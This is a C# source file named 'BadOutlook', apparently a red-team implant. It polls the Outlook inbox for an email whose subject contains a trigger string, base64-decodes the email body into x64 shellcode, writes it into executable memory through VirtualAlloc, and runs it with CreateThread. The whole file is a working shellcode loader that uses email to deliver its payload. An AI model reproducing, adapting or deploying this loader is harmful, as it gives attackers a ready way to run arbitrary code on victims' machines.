using System;
using System.Threading;
using System.Runtime.InteropServices;

namespace BadOutlook
{
    class Program
    {
        static void Main(string[] args)
        {
            string trigger = @"testtesttest2";
            int pollingInterval = 10; // number of seconds to wait between polls
           
            string body;


            bool execed = false;

            while (!execed) {

                var mails = OutlookEmails.ReadMailItems();
                int i = 1;
               
                foreach (dynamic mail in mails)
                {


                    if (mail.EmailSubject.Contains(trigger) )
                    {

                        body = mail.EmailBody;
                        body.Replace("\n","");
                        byte[] x64shellcode = Convert.FromBase64String(body);

                        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)x64shellcode.Length, 0x1000, 0x40);

                        Marshal.Copy(x64shellcode, 0, funcAddr, x64shellcode.Length);

                        IntPtr hThread = IntPtr.Zero;
                        uint threadId = 0;
                        IntPtr pinfo = IntPtr.Zero;

                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                        execed = true;
                        break;
                    }


                    i += 1;
                }
                
                Console.WriteLine("No trigger found, trying again in 10 seconds");
                Thread.Sleep(pollingInterval * 1000); // sleep for 10 seconds
            
            }



            Console.ReadKey();
            return;
        }

        #region pinvokes
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion


    }
}
